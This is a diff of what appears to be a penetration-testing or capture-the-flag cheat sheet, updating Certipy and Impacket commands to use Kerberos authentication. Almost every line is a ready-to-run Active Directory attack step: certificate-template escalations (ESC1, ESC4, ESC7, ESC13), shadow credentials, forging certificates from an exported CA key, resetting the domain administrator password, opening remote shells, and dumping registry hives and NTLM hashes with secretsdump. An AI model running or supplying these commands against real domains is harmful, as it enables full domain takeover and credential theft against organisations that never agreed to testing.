@@ -680,51 +680,54 @@ https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage
 impacket-getTGT $DOM/'$USERNAME:$PASSWORD'; kcme
 impacket-getTGT $DOM/'$USERNAME' -hashes ':'; kcme
 
++---------- Search Vulnerable ----------+
+certipy find -k -target $DC -dc-ip $TARGET -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
+
 +---------- AddKeyCredentialLink ----------+
-certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'
+certipy shadow auto -k -target $DC -dc-ip $TARGET -account 'SVC_CABACKUP'
 
 +---------- ESC1 ----------+
-adminSid=$(certipy account -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -target $DC -key-size '4096'
-certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
+adminSid=$(certipy account -k -target $DC -dc-ip $TARGET -user 'administrator' read 2>/dev/null | grep 'objectSid' | cut -d ':' -f2 | xargs -n1); certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -upn 'administrator' -sid "$adminSid" -key-size '4096'
+certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
 change_password administrator 123qweasdF!
 evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'
 impacket-atexec -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'@$TARGET "cmd.exe /c for /d %F in (C:\Users\*) do for %f in (%F\Desktop\user.txt %F\Desktop\root.txt) do @if exist %f @type %f 2>NUL | findstr /R /C:\"^[0-9a-f][0-9a-f]*$\"" | grep -vE '\[|-' | xargs -n1 | gg
 
 +---------- ESC4 ----------+
-certipy template -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -template '' -write-default-configuration
+certipy template -k -target $DC -dc-ip $TARGET -template '' -write-default-configuration
 
 +---------- ESC7 ----------+
-certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -add-officer '$USERNAME' -target $DC
-certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template 'SubCA' -upn 'administrator' -target $DC -key-size '4096' <<< 'y' | grep -v '[-]' | tee /dev/tty | awk '/Request ID is/ {printf "[*] Now use \x27%s.key\x27 in the following requests as -issue-request \x27%s\x27 and -retrieve \x27%s\x27\n", $5, $5, $5}'
-certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -issue-request ''
-certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -retrieve ''
-certipy auth -dc-ip $TARGET -domain $DOM -pfx 'administrator.pfx'
+certipy ca -k -target $DC -dc-ip $TARGET -ca "$CA" -add-officer '$USERNAME'
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'SubCA' -upn 'administrator' -key-size '4096' <<< 'y' | grep -v '[-]' | tee /dev/tty | awk '/Request ID is/ {printf "[*] Now use \x27%s.key\x27 in the following requests as -issue-request \x27%s\x27 and -retrieve \x27%s\x27\n", $5, $5, $5}'
+certipy ca -k -target $DC -dc-ip $TARGET -ca "$CA" -issue-request ''
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -retrieve ''
+certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'administrator.pfx'
 kcme; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
 
 +---------- ESC13 ----------+
-certipy req -dc-ip $TARGET -target $DC -k -ca "$CA" -template 'VulnerableTemplate' -upn 'NEW_UPN' -key-size 4096
-certipy auth -dc-ip $TARGET -pfx 'generated.pfx'; kcme
-certipy req -dc-ip $TARGET -target $DC -k -ca "$CA" -template 'DifferentTemplate' -key-size 4096
-certipy auth -dc-ip $TARGET -pfx 'generated.pfx'; kcme
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'VulnerableTemplate' -upn 'NEW_UPN' -key-size 4096
+certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'generated.pfx'; kcme
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template 'DifferentTemplate' -key-size 4096
+certipy auth -k -domain $DC -dc-ip $TARGET -pfx 'generated.pfx'; kcme
 impacket-reg -dc-ip $TARGET $DOM -k -no-pass backup -o '\programdata'
 evil-winrm --> login --> cd \programdata; download SAM.save ... SECURITY.save ... SYSTEM.save ...
 impacket-secretsdump -sam SAM.save -security SECURITY.save -system SYSTEM.save local
 impacket-secretsdump DC01$@$DC -hashes '$MACHINE.ACC_HASH' -just-dc-ntlm
 
 +---------- Request ----------+
-certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
-certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -dynamic-endpoint
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
+certipy req -k -target $DC -dc-ip $TARGET -ca "$CA" -template '' -dynamic-endpoint
 
 +---------- Forge ----------+
 certutil -store my
 certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
 certipy forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
-certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
+certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator_forged.pfx'
 change_password administrator 123qweasdF!
 evil-winrm -i '$TARGET' -u 'administrator' -p '123qweasdF!'
 
 +---------- Authenticate ----------+
-certipy auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
+certipy auth -k -domain $DC -dc-ip $TARGET -ldap-shell -pfx 'administrator.pfx'
 change_password administrator 123qweasdF!
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
 evil-winrm -i $TARGET -u administrator -H ''
